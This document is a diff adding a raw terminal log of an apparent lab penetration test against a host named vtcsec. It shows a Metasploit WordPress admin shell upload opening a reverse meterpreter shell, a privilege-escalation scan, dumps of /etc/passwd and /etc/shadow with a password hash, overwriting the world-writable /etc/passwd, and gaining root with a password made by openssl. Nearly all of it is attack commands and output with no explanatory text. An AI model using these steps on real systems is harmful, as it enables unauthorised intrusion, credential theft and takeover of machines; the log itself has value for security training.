@@ -1,0 +1,535 @@
+$ msfconsole                                                                                                   130 ⨯
+                                                  
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% https://metasploit.com %%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       =[ metasploit v6.1.14-dev                          ]
++ -- --=[ 2181 exploits - 1156 auxiliary - 399 post       ]
++ -- --=[ 596 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Start commands with a space to avoid saving 
+them to history
+
+msf6 > 
+msf6 > search wp_admin
+
+Matching Modules
+================
+
+   #  Name                                       Disclosure Date  Rank       Check  Description
+   -  ----                                       ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/wp_admin_shell_upload
+
+msf6 > use exploit/unix/webapp/wp_admin_shell_upload
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > show options
+
+Module options (exploit/unix/webapp/wp_admin_shell_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       The WordPress password to authenticate with
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/
+                                         Using-Metasploit
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the wordpress application
+   USERNAME                    yes       The WordPress username to authenticate with
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.54     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   WordPress
+
+
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password admin
+password => admin
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts vtcsec
+rhosts => vtcsec
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /secret/
+targeturi => /secret/
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
+username => admin
+msf6 exploit(unix/webapp/wp_admin_shell_upload) > run
+
+[*] Started reverse TCP handler on 192.168.1.54:4444 
+[*] Authenticating with WordPress using admin:admin...
+[+] Authenticated with WordPress
+[*] Preparing payload...
+[*] Uploading payload...
+[*] Executing the payload at /secret/wp-content/plugins/KBQnkRSPUk/yZFtqZfRMg.php...
+[*] Sending stage (39282 bytes) to 192.168.1.62
+[+] Deleted yZFtqZfRMg.php
+[+] Deleted KBQnkRSPUk.php
+[+] Deleted ../KBQnkRSPUk
+[*] Meterpreter session 1 opened (192.168.1.54:4444 -> 192.168.1.62:53602 ) at 2022-04-07 15:09:55 +0200
+
+meterpreter > 
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    detach                    Detach the meterpreter session (for http/https)
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    chmod         Change the permissions of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    shell         Drop into a system command shell
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+meterpreter > sysinfo
+Computer    : vtcsec
+OS          : Linux vtcsec 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64
+Meterpreter : php/linux
+meterpreter > getuid
+Server username: www-data
+meterpreter > shell
+Process 2368 created.
+Channel 0 created.
+sh: 0: getcwd() failed: No such file or directory
+sh: 0: getcwd() failed: No such file or directory
+python -c 'import pty;pty.spawn("/bin/bash")'
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+www-data@vtcsec:$ gcc
+gcc
+gcc: fatal error: no input files
+compilation terminated.
+www-data@vtcsec:$ exit
+exit
+exit
+exit
+meterpreter > 
+meterpreter > upload /usr/share/
+Display all 447 possibilities? (y or n)
+meterpreter > upload /usr/bin/uni
+unibrow             unicode_stop        uniq                unix-privesc-check  
+unicfgtst           unicorn-magic       uniscan             unix2dos            
+unicode_start       unicornscan         uniscan-gui         unix2mac            
+meterpreter > upload /usr/bin/unix-privesc-check /tmp/unix-privesc-check
+[*] uploading  : /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check
+[*] Uploaded -1.00 B of 35.94 KiB (-0.0%): /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check
+[*] uploaded   : /usr/bin/unix-privesc-check -> /tmp/unix-privesc-check
+meterpreter > shell
+Process 2409 created.
+Channel 2 created.
+sh: 0: getcwd() failed: No such file or directory
+sh: 0: getcwd() failed: No such file or directory
+python -c 'import pty;pty.spawn("/bin/bash")'
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+www-data@vtcsec:$ cd /tmp
+cd /tmp
+chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+www-data@vtcsec:/tmp$ ls
+ls
+systemd-private-ce113b2585f242edb849c9dfefebc53c-colord.service-wVoR02
+systemd-private-ce113b2585f242edb849c9dfefebc53c-rtkit-daemon.service-ieZhcR
+systemd-private-ce113b2585f242edb849c9dfefebc53c-systemd-timesyncd.service-QCniZC
+unix-privesc-check
+www-data@vtcsec:/tmp$ chmod +x unix-privesc-check
+chmod +x unix-privesc-check
+www-data@vtcsec:/tmp$ ./unix-privesc-check standard | grep WARNING
+./unix-privesc-check standard | grep WARNING
+Search the output below for the word 'WARNING'.  If you don't see it then
+WARNING: /etc/passwd is a critical config file. World write is set for /etc/passwd
+passwd: Permission denied.
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+./unix-privesc-check: 1076: [: standard: unexpected operator
+www-data@vtcsec:/tmp$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:110::/var/run/dbus:/bin/false
+uuidd:x:107:111::/run/uuidd:/bin/false
+lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:109:117::/nonexistent:/bin/false
+avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false
+speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false
+saned:x:119:127::/var/lib/saned:/bin/false
+usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false
+marlinspike:x:1000:1000:marlinspike,,,:/home/marlinspike:/bin/bash
+mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false
+sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin
+www-data@vtcsec:/tmp$ cat /etc/shadow
+cat /etc/shadow
+root:!:17484:0:99999:7:::
+daemon:*:17379:0:99999:7:::
+bin:*:17379:0:99999:7:::
+sys:*:17379:0:99999:7:::
+sync:*:17379:0:99999:7:::
+games:*:17379:0:99999:7:::
+man:*:17379:0:99999:7:::
+lp:*:17379:0:99999:7:::
+mail:*:17379:0:99999:7:::
+news:*:17379:0:99999:7:::
+uucp:*:17379:0:99999:7:::
+proxy:*:17379:0:99999:7:::
+www-data:*:17379:0:99999:7:::
+backup:*:17379:0:99999:7:::
+list:*:17379:0:99999:7:::
+irc:*:17379:0:99999:7:::
+gnats:*:17379:0:99999:7:::
+nobody:*:17379:0:99999:7:::
+systemd-timesync:*:17379:0:99999:7:::
+systemd-network:*:17379:0:99999:7:::
+systemd-resolve:*:17379:0:99999:7:::
+systemd-bus-proxy:*:17379:0:99999:7:::
+syslog:*:17379:0:99999:7:::
+_apt:*:17379:0:99999:7:::
+messagebus:*:17379:0:99999:7:::
+uuidd:*:17379:0:99999:7:::
+lightdm:*:17379:0:99999:7:::
+whoopsie:*:17379:0:99999:7:::
+avahi-autoipd:*:17379:0:99999:7:::
+avahi:*:17379:0:99999:7:::
+dnsmasq:*:17379:0:99999:7:::
+colord:*:17379:0:99999:7:::
+speech-dispatcher:!:17379:0:99999:7:::
+hplip:*:17379:0:99999:7:::
+kernoops:*:17379:0:99999:7:::
+pulse:*:17379:0:99999:7:::
+rtkit:*:17379:0:99999:7:::
+saned:*:17379:0:99999:7:::
+usbmux:*:17379:0:99999:7:::
+marlinspike:$6$wQb5nV3T$xB2WO/jOkbn4t1RUILrckw69LR/0EMtUbFFCYpM3MUHVmtyYW9.ov/aszTpWhLaC2x6Fvy5tpUUxQbUhCKbl4/:17484:0:99999:7:::
+mysql:!:17486:0:99999:7:::
+sshd:*:17486:0:99999:7:::
+www-data@vtcsec:/tmp$ exit
+exit
+exit
+exit
+meterpreter > download /etc/passwd /home/cayman/polytech/passwd
+[*] Downloading: /etc/passwd -> /home/cayman/polytech/passwd
+[*] Downloaded 2.31 KiB of 2.31 KiB (100.0%): /etc/passwd -> /home/cayman/polytech/passwd
+[*] download   : /etc/passwd -> /home/cayman/polytech/passwd
+meterpreter > upload /home/cayman/polytech/passwd /etc/passwd
+[*] uploading  : /home/cayman/polytech/passwd -> /etc/passwd
+[*] Uploaded -1.00 B of 2.34 KiB (-0.04%): /home/cayman/polytech/passwd -> /etc/passwd
+[*] uploaded   : /home/cayman/polytech/passwd -> /etc/passwd
+meterpreter > shell
+Process 16539 created.
+Channel 5 created.
+sh: 0: getcwd() failed: No such file or directory
+sh: 0: getcwd() failed: No such file or directory
+python -c 'import pty;pty.spawn("/bin/bash")'
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+www-data@vtcsec:$ su -
+su -
+Password: toto
+
+root@vtcsec:~# whoami
+whoami
+root
+root@vtcsec:~#
+
+
+$ openssl passwd -1 toto
+$1$x3ed0iqe$V86Go4WbYC3Dq1/YyWp6T1
